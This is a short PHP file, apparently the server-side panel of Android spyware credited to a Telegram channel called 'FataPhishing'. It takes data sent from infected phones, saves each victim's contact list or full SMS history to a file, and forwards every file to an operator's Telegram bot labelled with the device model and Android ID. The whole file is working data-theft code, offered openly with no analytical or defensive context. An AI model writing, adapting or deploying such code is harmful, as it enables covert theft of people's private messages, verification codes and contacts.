//Channel @FataPhishing
//Pv @Dev_Fata
<?php 
include("info.php");
if(isset($_GET['result'])){
 $result=$_GET['result'];
 if($result == "ok"){
 $action=$_GET['action'];
 if(isset($_GET['androidid'])){
 $androidid=  $_GET['androidid'];
 }if(isset($_GET['model'])){
 $model=$_GET['model']; 
 }if(isset($_GET['opr'])){
 $opr = $_GET['opr'];
 }
if($action =="upload1"){
$PostData = file_get_contents("php://input");
$File = fopen("data/Contacts.txt","w");
fwrite($File, $PostData); 
fclose($File);
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.telegram.org/bot'.$token.'/sendDocument?chat_id='.$id,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => array('document'=> new CURLFILE('data/Contacts.txt'),"caption"=>"ᴛᴀʀɢᴇᴛ ᴄᴏɴᴛᴀᴄᴛ ғɪʟᴇ ( $model )

ᴀɴᴅʀᴏɪᴅ : $androidid

#ᴄᴏᴅᴇᴅ : @Dev_Fata")
));
$response = curl_exec($curl);
curl_close($curl);

}
if($action =="upload"){
$PostData = file_get_contents("php://input");
$File = fopen("data/AllSms.txt","w");
fwrite($File, $PostData); 
fclose($File);
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.telegram.org/bot'.$token.'/sendDocument?chat_id='.$id,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => array('document'=> new CURLFILE('data/AllSms.txt'),"caption"=>"ᴛᴀʀɢᴇᴛ ᴀʟʟ sᴍs ғɪʟᴇ ( $model )

ᴀɴᴅʀᴏɪᴅ : $androidid

#ᴄᴏᴅᴇᴅ : @Dev_Fata")
));
$response = curl_exec($curl);
curl_close($curl);

}}}

?>